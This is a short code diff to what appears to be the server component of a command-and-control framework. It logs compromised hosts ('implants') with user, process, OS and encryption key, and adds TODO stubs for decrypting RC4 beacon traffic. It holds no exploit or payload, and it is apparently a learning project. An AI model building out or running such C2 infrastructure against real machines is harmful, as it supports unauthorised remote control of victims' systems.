@@ -81,7 +81,7 @@ class WebServer(object):
             now = datetime.datetime.now()
             time = now.strftime("%Y-%m-%d %H:%M:%S")
 
-            # TO DO: INSERT an entry into the "implants" table here
+            # inserts an entry into the "implants" table
             with self.connection.cursor() as cursor:
                 statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
                 cursor.execute(statement, (hostname,
@@ -96,5 +96,9 @@ class WebServer(object):
 
         # exception means it is an rc4 beacon instead
         except Exception as e:
+            # TO DO: SELECT encryption_key FROM implants query here
+
+            # TO DO: loop through each queried encryption key and try to decrypt post data (self.data)
+
             print(str(e))
             return "rc4 beacon"
